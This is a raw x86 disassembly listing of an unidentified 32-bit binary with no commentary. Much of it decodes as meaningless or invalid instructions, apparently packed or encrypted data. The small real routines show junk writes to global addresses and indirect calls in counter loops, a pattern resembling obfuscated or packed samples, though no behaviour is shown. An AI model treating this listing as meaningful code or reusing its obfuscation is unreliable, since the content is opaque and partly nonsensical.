  404200:	jo     0x404245
  404202:	inc    esp
  404203:	mov    ecx,0x901bc481
  404208:	and    dl,BYTE PTR [ecx+0x423d8d22]
  40420e:	imul   edi
  404210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404211:	ror    BYTE PTR [esi-0x3599cfa6],0xf6
  404218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404219:	jl     0x4041ca
  40421b:	cli    
  40421c:	pop    ss
  40421d:	push   ecx
  40421e:	imul   esi,edi,0x35
  404221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404222:	cmp    al,0x3e
  404224:	neg    ah
  404226:	inc    esi
  404227:	(bad)  
  404228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404229:	test   dh,dh
  40422b:	jae    0x40428f
  40422d:	dec    edx
  40422e:	es out dx,eax
  404230:	xor    ecx,DWORD PTR [ebp-0x7f]
  404233:	out    dx,eax
  404234:	mov    WORD PTR [eax+0x14],fs
  404237:	bound  esp,QWORD PTR [edx+0x5a670dc8]
  40423d:	icebp  
  40423e:	popf   
  40423f:	ja     0x404212
  404241:	pop    esp
  404242:	call   0x817ec2cc
  404247:	ret    
  404248:	mov    eax,?
  40424a:	into   
  40424b:	and    eax,0x5254709d
  404250:	push   ss
  404251:	adc    ecx,DWORD PTR [edx]
  404253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404254:	test   cl,al
  404256:	cld    
  404257:	xor    al,0x38
  404259:	xor    al,ch
  40425b:	fld    TBYTE PTR [edx+0x69]
  40425e:	out    0x14,al
  404260:	mov    eax,0xe365fea7
  404265:	dec    edx
  404266:	ror    DWORD PTR [ebx],1
  404268:	cmp    edx,DWORD PTR [ecx]
  40426a:	pop    edi
  40426b:	jmp    0x8a3fec72
  404270:	sbb    BYTE PTR [edi],ch
  404272:	into   
  404273:	mov    eax,0x234a8317
  404278:	mov    al,0xe
  40427a:	pop    eax
  40427b:	add    dh,BYTE PTR [ecx]
  40427d:	ss inc esi
  40427f:	and    ax,si
  404282:	mov    ah,0xb4
  404284:	int3   
  404285:	rcr    eax,cl
  404287:	mov    eax,0x66bb1010
  40428c:	test   DWORD PTR [edx-0x31c893e2],edi
  404292:	loope  0x4042e5
  404294:	jl     0x4042e9
  404296:	or     DWORD PTR [ecx],ebx
  404298:	sti    
  404299:	or     edx,esi
  40429b:	add    al,0x1c
  40429d:	dec    esi
  40429e:	into   
  40429f:	shl    dh,1
  4042a1:	(bad)  
  4042a2:	ss test eax,0x2408c965
  4042a8:	inc    esi
  4042a9:	cmp    al,0xef
  4042ab:	mov    WORD PTR [edi-0x1],cs
  4042ae:	daa    
  4042af:	cmp    DWORD PTR [ebx-0x20],ecx
  4042b2:	fwait
  4042b3:	cmp    BYTE PTR [esi],0x1e
  4042b6:	xchg   edx,eax
  4042b7:	(bad)  
  4042b9:	sbb    BYTE PTR [edx+eiz*1-0x6f398a05],0x52
  4042c1:	and    ch,bh
  4042c3:	push   ss
  4042c4:	mov    al,bh
  4042c6:	int3   
  4042c7:	jbe    0x404267
  4042c9:	push   es
  4042ca:	xchg   edx,eax
  4042cb:	jno    0x4042c7
  4042cd:	loopne 0x404338
  4042cf:	es or  eax,0x4a1c6ddc
  4042d5:	jp     0x4042c7
  4042d7:	sbb    esi,DWORD PTR [ecx+0x22]
  4042da:	jle    0x40432e
  4042dc:	dec    ebp
  4042dd:	shl    bl,0xfb
  4042e0:	inc    ecx
  4042e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042e2:	aam    0x37
  4042e4:	push   es
  4042e5:	shr    DWORD PTR [ebx-0x24],1
  4042e8:	xchg   edx,eax
  4042e9:	pop    ecx
  4042ea:	lods   al,BYTE PTR fs:[esi]
  4042ec:	sbb    al,bh
  4042ee:	and    eax,0x1ea93b15
  4042f3:	xor    bl,BYTE PTR [ebx+ebp*4-0x7f79de6d]
  4042fa:	pop    ss
  4042fb:	in     eax,0x37
  4042fd:	gs cmp ah,cl
  404300:	push   edi
  404301:	jge    0x40437c
  404303:	mov    al,ds:0x52e15cf1
  404308:	mov    ah,0x2b
  40430a:	fld    QWORD PTR [edx-0x53]
  40430d:	popa   
  40430e:	addr16 jp 0x40435a
  404311:	sbb    dh,dh
  404313:	fst    DWORD PTR [eax+0x2de4c754]
  404319:	lahf   
  40431a:	jg     0x40433f
  40431c:	pushf  
  40431d:	out    dx,eax
  40431e:	adc    al,0x68
  404320:	xchg   BYTE PTR [edi],dl
  404322:	mov    edx,0xa9b64d62
  404327:	ins    DWORD PTR es:[edi],dx
  404328:	test   eax,0xaa45c9bd
  40432d:	ror    DWORD PTR [ecx+0x1b870502],0x7b
  404334:	xchg   esp,eax
  404335:	dec    ebp
  404336:	mov    edi,DWORD PTR [edx-0x1]
  404339:	or     ebp,DWORD PTR [edx+0x2ce41220]
  40433f:	daa    
  404340:	call   0x2410:0x708e8d02
  404347:	xchg   edi,esi
  404349:	ret    
  40434a:	pushf  
  40434b:	fmulp  st(5),st
  40434d:	shl    BYTE PTR [eax+0x2c],1
  404350:	or     edi,DWORD PTR [eax-0x4]
  404353:	or     edx,edi
  404355:	pop    edx
  404356:	pop    ss
  404357:	xchg   BYTE PTR [bx+si],dl
  40435a:	ins    BYTE PTR es:[edi],dx
  40435b:	dec    ebx
  40435c:	push   ss
  40435d:	lock shl DWORD PTR [edi+0x61],0xc
  404362:	ins    BYTE PTR es:[edi],dx
  404363:	or     BYTE PTR gs:[esp+edi*8],cl
  404367:	or     BYTE PTR [esi-0x1a],ah
  40436a:	nop
  40436b:	(bad)  
  40436c:	xchg   BYTE PTR [ebp-0x50],ah
  40436f:	add    dl,BYTE PTR [ebx+ebx*8]
  404372:	cwde   
  404373:	sbb    dh,BYTE PTR [edi-0x50a12434]
  404379:	or     edx,DWORD PTR [esi-0x721efee0]
  40437f:	mov    eax,ds:0x7108437c
  404384:	loopne 0x404347
  404386:	pop    es
  404387:	and    bh,al
  404389:	inc    ebp
  40438a:	cld    
  40438b:	xor    al,BYTE PTR [ebp+0x458bf89c]
  404391:	cld    
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42ec6f,0x42e640
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ec67,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x4302b5,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42ec6f,0x4302b5
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x43035f,0x42e648
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e64c,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ec63,0x42ec6b
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42ec6b,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x4302cd,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	sbb    bh,BYTE PTR [edi]
  40442e:	push   edi
  40442f:	dec    eax
  404430:	std    
  404431:	sbb    DWORD PTR [esi+0x7e],edi
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x40447d
  404439:	imul   ebp,DWORD PTR [edi-0x4d73d923],0xfffffff0
  404440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404441:	out    dx,eax
  404442:	mov    ecx,0xa1f7558
  404447:	jmp    0x22ec9ce
  40444c:	mov    eax,0x41d347e9
  404451:	xchg   edi,eax
  404452:	mov    DWORD PTR [edi*4-0x9be69be],ebp
  404459:	cld    
  40445a:	cmp    edi,DWORD PTR ds:0x3b06c8d4
  404460:	dec    ecx
  404461:	(bad)  
  404462:	imul   ebp,esp,0x81567b5d
  404468:	fwait
  404469:	imul   ebp,DWORD PTR [esi-0x54],0xffffffff
  40446d:	dec    eax
  40446e:	out    0xc5,eax
  404470:	or     BYTE PTR gs:[edi-0x35],cl
  404474:	mov    ebp,0x7e1eaeee
  404479:	xchg   ebp,eax
  40447a:	cs dec eax
  40447c:	(bad)  
  40447e:	rcl    BYTE PTR ds:0x91b876b0,1
  404484:	aam    0xc9
  404486:	lea    ebx,[eax+0x655bc7b6]
  40448c:	xchg   esi,eax
  40448d:	and    ecx,esi
  40448f:	jbe    0x40442a
  404491:	dec    BYTE PTR [edi]
  404493:	(bad)  
  404494:	cli    
  404495:	pop    es
  404496:	cwde   
  404497:	inc    ebp
  404498:	mov    cl,0xe4
  40449a:	lock arpl WORD PTR [eax-0x517bbf0f],si
  4044a1:	in     eax,0x5c
  4044a3:	ins    DWORD PTR es:[edi],dx
  4044a4:	mov    dh,0x8
  4044a6:	xchg   edi,eax
  4044a7:	jns    0x4044be
  4044a9:	ror    BYTE PTR [edx+0x3c],1
  4044ac:	sub    BYTE PTR [edx+eax*8],bl
  4044af:	pop    ebp
  4044b0:	(bad)  
  4044b1:	(bad)  
  4044b2:	jl     0x404516
  4044b4:	sub    al,0xd3
  4044b6:	sub    al,0x35
  4044b8:	push   esi
  4044b9:	push   es
  4044ba:	dec    esp
  4044bb:	lock shl DWORD PTR [ebp-0x3976d7a2],cl
  4044c2:	xor    ecx,DWORD PTR [ebx+0x45]
  4044c5:	fisubr DWORD PTR [ebx-0x5d5cc206]
  4044cb:	in     eax,dx
  4044cc:	and    ebp,DWORD PTR [esi-0x51313437]
  4044d2:	test   al,0xfd
  4044d4:	daa    
  4044d5:	repnz add ah,0xcd
  4044d9:	add    eax,0x1867c595
  4044de:	sub    eax,0x745fadbc
  4044e3:	imul   esp,DWORD PTR [edx],0x26e01cd0
  4044e9:	fst    DWORD PTR [edx]
  4044eb:	cli    
  4044ec:	xchg   edx,eax
  4044ed:	rcl    dh,1
  4044ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044f0:	ds push esp
  4044f2:	adc    eax,0xa6d2ed3f
  4044f7:	add    bl,BYTE PTR [edx+0x65]
  4044fa:	scas   eax,DWORD PTR es:[edi]
  4044fb:	cwde   
  4044fc:	mov    esp,0xbd6be88c
  404501:	test   BYTE PTR fs:[ebx],bh
  404504:	mov    ah,0x4c
  404506:	lods   al,BYTE PTR ds:[esi]
  404507:	jne    0x40452a
  404509:	jbe    0x4044a7
  40450b:	add    dl,dh
  40450d:	ins    BYTE PTR es:[edi],dx
  40450e:	mov    al,dl
  404510:	mov    dl,ah
  404512:	aas    
  404513:	retf   
  404514:	out    dx,eax
  404515:	int3   
  404516:	aaa    
  404517:	xchg   edx,eax
  404518:	jae    0x404536
  40451a:	aas    
  40451b:	inc    edx
  40451c:	jmp    0x4044f4
  40451e:	mov    ch,0x2e
  404520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404521:	(bad)  
  404522:	not    BYTE PTR [edi]
  404524:	inc    ebp
  404525:	clc    
  404526:	aas    
  404527:	repnz sbb eax,DWORD PTR [esp+ebx*1+0x55]
  40452c:	cmp    bh,BYTE PTR [ecx-0xf9a6681]
  404532:	ret    0x6354
  404535:	pusha  
  404536:	pop    edx
  404537:	scas   al,BYTE PTR es:[edi]
  404538:	xor    ecx,DWORD PTR [edx+0x27]
  40453b:	xchg   DWORD PTR [edi],esi
  40453d:	mov    ebx,0xd32bed1b
  404542:	mov    al,ds:0x8dfc4417
  404547:	aaa    
  404548:	cli    
  404549:	push   esp
  40454a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454b:	jmp    0xf465a190
  404550:	sub    al,0x9f
  404552:	das    
  404553:	mov    ebx,0xed5a9d59
  404558:	stos   BYTE PTR es:[edi],al
  404559:	xchg   ecx,eax
  40455a:	retf   
  40455b:	and    eax,0xa725be9
  404560:	fisttp DWORD PTR [edi+0x2f4f77b7]
  404566:	ret    
  404567:	fisubr WORD PTR [eax]
  404569:	push   edi
  40456a:	stos   DWORD PTR es:[edi],eax
  40456b:	xchg   DWORD PTR ds:0x2d50cfac,ebp
  404571:	and    al,0x11
  404574:	cmp    ecx,edx
  404576:	adc    al,0xe3
  404578:	sbb    bl,BYTE PTR [edi+0x2299d2ab]
  40457e:	int    0x3c
  404580:	push   ss
  404581:	aaa    
  404582:	int3   
  404583:	sbb    ah,BYTE PTR [eax-0x6d0a484c]
  404589:	in     al,0xb
  40458b:	in     al,0xea
  40458d:	fwait
  40458e:	or     dl,BYTE PTR [esi]
  404590:	out    dx,eax
  404591:	sub    DWORD PTR [eax-0x7e],0xffffff9d
  404595:	add    DWORD PTR ds:0x16051e6a,ebx
  40459b:	aad    0x3b
  40459d:	fisubr WORD PTR [ebx-0x61b168]
  4045a3:	dec    edi
  4045a4:	imul   edx,DWORD PTR [ecx+0x79],0xbf13c8a
  4045ab:	or     DWORD PTR [edi-0x76c1e85],eax
  4045b1:	xor    BYTE PTR [ecx],dh
  4045b3:	mov    eax,ds:0x2189ed42
  4045b8:	jmp    0xcc1f:0x1cb973fa
  4045bf:	xor    ebx,0xfffffff0
  4045c2:	sbb    al,0x6e
  4045c4:	mov    WORD PTR [ecx+ebx*8],?
  4045c7:	stos   DWORD PTR es:[edi],eax
  4045c8:	push   ebp
  4045c9:	xor    DWORD PTR [esi],0x3f
  4045cc:	or     DWORD PTR [edi],edi
  4045ce:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045d0:	xchg   esi,eax
  4045d1:	(bad)  
  4045d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045d3:	ret    0xbc
  4045d6:	push   edx
  4045d7:	int3   
  4045d8:	dec    ecx
  4045d9:	jb     0x4045db
  4045db:	pop    es
  4045dc:	sub    dh,BYTE PTR [ebp-0x35]
  4045df:	add    eax,ecx
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x430367,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x4302b9,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x4302b9
  40460c:	inc    eax
  40460d:	mov    ds:0x4302b9,eax
  404612:	cmp    DWORD PTR ds:0x4302b9,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x4302b9,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ea93
  404650:	cmp    DWORD PTR ds:0x4302b9,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x4302b9
  404662:	inc    eax
  404663:	mov    ds:0x4302b9,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42ec53,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x4302b9,0x4302f1
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x4302dd,0x42ec5b
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x40473a
  4046fa:	push   ss
  4046fb:	and    DWORD PTR [ecx],0x24
  4046fe:	daa    
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x404721
  404706:	ror    BYTE PTR [eax-0x31],1
  404709:	and    DWORD PTR [eax],ebp
  40470b:	mov    ch,0xef
  40470d:	inc    eax
  40470e:	pop    es
  40470f:	sbb    BYTE PTR [ebp-0x17],ah
  404712:	rol    ch,1
  404714:	aaa    
  404715:	cmp    edx,DWORD PTR [edx+ebp*2-0x26f11012]
  40471c:	(bad)  
  40471d:	in     eax,dx
  40471e:	leave  
  40471f:	push   esi
  404720:	xor    DWORD PTR gs:[ecx-0x2d],ecx
  404724:	or     eax,0x16d3770d
  404729:	push   ss
  40472a:	sbb    ebp,DWORD PTR [eax]
  40472c:	into   
  40472d:	outs   dx,BYTE PTR ds:[esi]
  40472e:	cwde   
  40472f:	loope  0x404785
  404731:	inc    ebp
  404732:	clc    
  404733:	inc    esi
  404734:	jmp    0x4046be
  404736:	jp     0x4046de
  404738:	cmp    al,0xe7
  40473a:	inc    ebp
  40473b:	adc    eax,0x495c38fd
  404740:	js     0x4046f8
  404742:	sbb    al,0x51
  404744:	sbb    bl,bl
  404746:	jp     0x40476d
  404748:	ja     0x4046d6
  40474a:	xchg   esi,eax
  40474b:	cmp    cl,BYTE PTR [edx]
  40474d:	adc    BYTE PTR [ebp-0x58d5bae6],ch
  404753:	(bad)  
  404754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404755:	jecxz  0x40477e
  404757:	jbe    0x4046ea
  404759:	test   eax,0xead03230
  40475e:	mov    dh,bh
  404760:	stc    
  404761:	bound  edx,QWORD PTR [esi+0x6d]
  404764:	and    eax,0x433d71d3
  404769:	adc    al,0xa
  40476b:	out    dx,al
  40476c:	xorps  xmm2,XMMWORD PTR [edi]
  40476f:	mov    cl,0xd3
  404771:	loope  0x40479a
  404773:	cwde   
  404774:	lea    edi,[esi]
  404776:	xchg   esp,eax
  404777:	mov    bh,0xcc
  404779:	xchg   ecx,eax
  40477a:	mov    ds:0x1387cc6b,al
  40477f:	mov    ds:0xee3a161,eax
  404784:	sbb    BYTE PTR [edi],bh
  404786:	push   0xcdb42cc2
  40478b:	jecxz  0x4047a4
  40478d:	sbb    BYTE PTR [eax-0x6a],dl
  404790:	popf   
  404791:	outs   dx,DWORD PTR ds:[esi]
  404792:	sbb    DWORD PTR [ebx],esi
  404794:	mov    esp,DWORD PTR [ecx+0x5c]
  404797:	nop
  404798:	push   0xffffff91
  40479a:	lahf   
  40479b:	loopne 0x40481a
  40479d:	and    al,0xbf
  40479f:	add    eax,0xb943b996
  4047a4:	sbb    BYTE PTR [edi+0x36],cl
  4047a7:	test   eax,0xd05004ed
  4047ac:	shr    DWORD PTR [esi-0x7d9c19a9],0x98
  4047b3:	daa    
  4047b4:	gs mov edx,0x76405817
  4047ba:	je     0x404784
  4047bc:	scas   al,BYTE PTR es:[edi]
  4047bd:	and    dl,BYTE PTR [esi-0x51]
  4047c0:	cmp    DWORD PTR [eax-0x6a],0x6f066b4d
  4047c7:	sbb    al,0xba
  4047c9:	hlt    
  4047ca:	int3   
  4047cb:	imul   eax,ebx,0xffffffc3
  4047ce:	and    eax,0xc98890ea
  4047d3:	xchg   esp,eax
  4047d4:	mov    bh,0x81
  4047d6:	pop    ecx
  4047d7:	push   eax
  4047d8:	out    0x8f,al
  4047da:	ror    BYTE PTR [ecx-0x15cf3f4f],1
  4047e0:	mov    edx,0xed184af2
  4047e5:	mov    ss,WORD PTR [ecx+esi*1-0x7e]
  4047e9:	mov    dl,BYTE PTR [ebx+0xa]
  4047ec:	lea    cx,[ebp+0x7d]
  4047f0:	jno    0x404805
  4047f2:	jp     0x40486c
  4047f4:	lea    ecx,[ebx-0x3b]
  4047f7:	sub    esp,DWORD PTR [esi-0x735399dd]
  4047fd:	fucomi st,st(3)
  4047ff:	lea    ebp,[edx-0x69]
  404802:	pop    ss
  404803:	mov    esp,0xdd048ac0
  404808:	lods   eax,DWORD PTR ds:[esi]
  404809:	xchg   BYTE PTR [ecx-0x3a891197],ah
  40480f:	stos   DWORD PTR es:[edi],eax
  404810:	bound  esi,QWORD PTR [eax]
  404812:	xchg   esi,eax
  404813:	in     eax,0xf0
  404815:	xchg   esp,eax
  404816:	jbe    0x40483f
  404818:	arpl   WORD PTR [ecx],si
  40481a:	hlt    
  40481b:	sbb    BYTE PTR [eax-0x7a331498],dl
  404821:	pushf  
  404822:	or     DWORD PTR [edx+0x2a],esp
  404825:	xor    eax,0x43329dad
  40482a:	mov    ds:0x95bd8b36,al
  40482f:	dec    DWORD PTR [ebx+0x4b095cc6]
  404835:	mov    al,0xc7
  404837:	xor    edx,esi
  404839:	bound  eax,QWORD PTR [ebp+0x8]
  40483c:	scas   al,BYTE PTR es:[edi]
  40483d:	adc    DWORD PTR [ecx+ecx*4-0x1f],ebx
  404841:	sub    eax,0xe192b65
  404846:	(bad)  
  404848:	dec    esi
  404849:	shl    DWORD PTR [edi],1
  40484b:	fnstsw WORD PTR [eax]
  40484d:	xlat   BYTE PTR ds:[ebx]
  40484e:	lock fs jg 0x4047f8
  404852:	pop    ds
  404853:	mov    al,0x22
  404855:	jne    0x4048b5
  404857:	cld    
  404858:	test   al,0x64
  40485a:	aas    
  40485b:	hlt    
  40485c:	retf   
  40485d:	push   ebp
  40485e:	push   cs
  40485f:	nop
  404860:	and    eax,0xed5d1a7b
  404865:	lock into 
  404867:	inc    esi
  404868:	inc    eax
  404869:	xchg   edx,eax
  40486a:	cs jecxz 0x4048bc
  40486d:	pop    edi
  40486e:	jg     0x40482c
  404870:	or     al,bh
  404872:	xor    esi,DWORD PTR [esi]
  404874:	sar    BYTE PTR [esi+0x7c],1
  404877:	xchg   esi,eax
  404878:	(bad)  
  404879:	push   ds
  40487a:	adc    edx,esp
  40487c:	fndisi(8087 only) 
  40487e:	aad    0xd8
  404880:	pop    ss
  404881:	and    ch,BYTE PTR [edi-0x12]
  404884:	mov    esp,0x51bde2f5
  404889:	sbb    al,0x9c
  40488b:	ins    DWORD PTR es:[edi],dx
  40488c:	sub    esp,DWORD PTR [edi+0x23]
  40488f:	or     BYTE PTR [ecx+0x4d],0xb3
  404893:	or     eax,ebp
  404895:	into   
  404896:	ins    BYTE PTR es:[edi],dx
  404897:	fwait
  404898:	push   0x30
  40489a:	popf   
  40489b:	int3   
  40489c:	dec    ecx
  40489d:	sbb    al,0x81
  40489f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048a0:	dec    edx
  4048a1:	lds    edx,FWORD PTR [esi-0x61]
  4048a4:	leave  
  4048a5:	pop    ss
  4048a6:	cdq    
  4048a7:	jg     0x404852
  4048a9:	aaa    
  4048aa:	and    dh,ch
  4048ac:	adc    edi,DWORD PTR [edx-0x20be0526]
  4048b2:	pop    esp
  4048b3:	sbb    dl,bh
  4048b5:	iret   
  4048b6:	and    BYTE PTR ds:0xa45d497e,cl
  4048bd:	lods   eax,DWORD PTR ds:[esi]
  4048be:	fistp  QWORD PTR [edx]
  4048c0:	add    DWORD PTR [edi+0x3ed3eeec],0xffffffaf
  4048c7:	adc    al,ah
  4048c9:	ror    bh,cl
  4048cb:	je     0x4048b2
  4048cd:	mov    dh,0xf9
  4048cf:	mov    dh,0x3a
  4048d1:	pop    es
  4048d2:	dec    edx
  4048d3:	mov    ebx,0xbbeabd14
  4048d8:	addr16 stc 
  4048da:	mov    ds:0x7fa4f070,al
  4048df:	sbb    eax,esp
  4048e1:	mov    al,ds:0x91a4a937
  4048e6:	inc    ebp
  4048e7:	imul   edx,esi,0xcc9731ab
  4048ed:	jb     0x404959
  4048ef:	dec    ebp
  4048f0:	sub    dh,0x9a
  4048f3:	lods   al,BYTE PTR ds:[esi]
  4048f4:	push   dx
  4048f6:	add    al,0x5e
  4048f8:	popf   
  4048f9:	rcl    dl,cl
  4048fb:	in     al,0x78
  4048fd:	mov    eax,edx
  4048ff:	add    DWORD PTR [eax+0x1c],0xca5b1851
  404906:	sub    edi,0xcc8d06ab
  40490c:	mov    dh,BYTE PTR [esi]
  40490e:	je     0x404976
  404910:	stc    
  404911:	shl    DWORD PTR [edx],0x91
  404914:	cmp    ebx,DWORD PTR [edi+0x4]
  404917:	adc    al,0x12
  404919:	pop    ecx
  40491a:	push   ds
  40491b:	mov    ebx,0xcab36130
  404920:	call   0x58775d4d
  404925:	mov    dh,0x17
  404927:	mov    edi,ebp
  404929:	sbb    eax,0x88858e23
  40492e:	into   
  40492f:	imul   ebp,DWORD PTR [edi+0x7d83c8e0],0xffffffa8
  404936:	aas    
  404937:	push   ecx
  404938:	mov    esi,0xfe531931
  40493d:	inc    edx
  40493e:	dec    ebx
  40493f:	inc    ecx
  404940:	inc    DWORD PTR [ecx]
  404942:	daa    
  404943:	aam    0x16
  404945:	pop    esi
  404946:	sbb    BYTE PTR [ebx-0x7],dl
  404949:	adc    DWORD PTR [ecx],ecx
  40494b:	gs into 
  40494d:	xchg   ebp,eax
  40494e:	jp     0x4049c1
  404950:	popa   
  404951:	or     DWORD PTR [eax],esi
  404953:	push   esi
  404954:	mov    esi,0xff445317
  404959:	mov    bh,0xb
  40495b:	ja     0x4049c1
  40495d:	sub    DWORD PTR [edx],0x9f28e282
  404963:	es scas eax,DWORD PTR es:[edi]
  404965:	xor    BYTE PTR [ecx],dh
  404967:	bound  edi,QWORD PTR [edx+0x42845837]
  40496d:	cmp    al,0x77
  40496f:	jno    0x4049e4
  404971:	inc    esi
  404972:	push   es
  404973:	and    dh,BYTE PTR ds:0xae039d89
  404979:	mov    dl,0x63
  40497b:	xchg   BYTE PTR [ecx+edi*8+0x7df8f826],bl
  404982:	pop    ebx
  404983:	cmp    DWORD PTR [ebp+0x4e],ebx
  404986:	pop    edi
  404987:	into   
  404988:	inc    ebx
  404989:	(bad)  
  40498b:	mov    ebp,0xe0b66751
  404990:	fnsave [eax-0x32b844c9]
  404996:	mov    edx,0xfe8eff72
  40499b:	pop    edi
  40499c:	out    0x92,al
  40499e:	dec    eax
  40499f:	cs xor eax,0x89dc034c
  4049a5:	add    al,BYTE PTR [ecx+0x42e65825]
  4049ab:	add    BYTE PTR [eax],al
  4049ad:	add    BYTE PTR [eax],al
  4049af:	add    BYTE PTR [ebx],dh
  4049b1:	shl    BYTE PTR [ebx],cl
  4049b3:	adc    eax,0x42e658
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e658,edx
  4049bf:	cmp    DWORD PTR ds:0x42e658,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e84f
  4049da:	cmp    DWORD PTR ds:0x42e658,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e658
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e658,edx
  4049f4:	cmp    DWORD PTR ds:0x42e658,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42ec6b,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x43034f,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ec67,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x430363,0x43035f
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ec67,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x43035b
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
